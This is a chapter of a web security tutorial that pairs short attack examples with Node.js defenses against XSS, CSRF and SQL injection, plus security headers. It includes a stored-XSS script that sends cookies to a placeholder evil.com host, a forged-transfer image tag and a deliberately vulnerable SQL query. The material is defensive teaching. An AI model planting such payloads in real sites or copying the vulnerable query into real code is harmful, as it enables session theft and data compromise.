# 18. Security — Common Attacks and Defenses

## XSS (Cross-Site Scripting)

**Attack**: Inject malicious script into a web page.

```html
<!-- Stored XSS: User submits: -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

**Defense**:

```javascript
// Escape user input
const escapeHtml = (str) => {
    return str
        .replace(/&/g, '&amp;').replace(/</g, '&lt;')
        .replace(/>/g, '&gt;').replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
};

// Content Security Policy
res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted.cdn.com"
);

// HttpOnly cookies (prevents JS from reading cookies)
res.cookie('sessionId', token, { httpOnly: true, secure: true });
```

## CSRF (Cross-Site Request Forgery)

**Attack**: Malicious site makes authenticated requests on behalf of the user.

```html
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```

**Defense**:

```javascript
// 1. SameSite cookies
res.cookie('sessionId', token, { sameSite: 'strict' });

// 2. CSRF tokens
app.use((req, res, next) => {
    const csrfToken = crypto.randomUUID();
    req.csrfToken = csrfToken;
    res.cookie('csrf-token', csrfToken, { httpOnly: true });
    next();
});

app.post('/api/transfer', (req, res) => {
    if (req.cookies['csrf-token'] !== req.headers['x-csrf-token']) {
        return res.status(403).json({ error: 'CSRF validation failed' });
    }
});

// 3. Check Origin/Referer header
if (req.headers.origin !== 'https://myapp.com') {
    return res.status(403).send('Forbidden');
}
```

## SQL Injection

**Attack**: Inject SQL commands via user input.

```javascript
// VULNERABLE: string concatenation
const query = `SELECT * FROM users WHERE name = '${userInput}'`;

// SAFE: parameterized queries
db.query('SELECT * FROM users WHERE name = $1', [userInput]);
User.findOne({ where: { name: userInput } });
```

## Security Headers with Helmet

```javascript
const helmet = require('helmet');
app.use(helmet());

// Individual headers:
res.setHeader('X-Content-Type-Options', 'nosniff');
res.setHeader('X-Frame-Options', 'DENY');
res.setHeader('X-XSS-Protection', '1; mode=block');
res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
res.setHeader('Referrer-Policy', 'no-referrer');
res.setHeader('Permissions-Policy', 'geolocation=(), microphone=()');
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Which attack is possible? | XSS, CSRF, SQLi, MITM, Brute force, Replay |
| Which defense exists? | HttpOnly, SameSite, CSP, CSRF tokens, rate limiting |
| Is HTTPS used? | Must be for production |
| Are cookies HttpOnly? | Prevents XSS from stealing cookies |
| Is input validated/sanitized? | Prevents injection attacks |
## Next Steps

[Back to Chapter 17](17-caching-api-versioning.md): 17. Caching Strategies and API Versioning
[Proceed to Chapter 19](19-api-gateway-reverse-proxy.md): 19. API Gateway and Reverse Proxy to learn about 19. api gateway and reverse proxy.
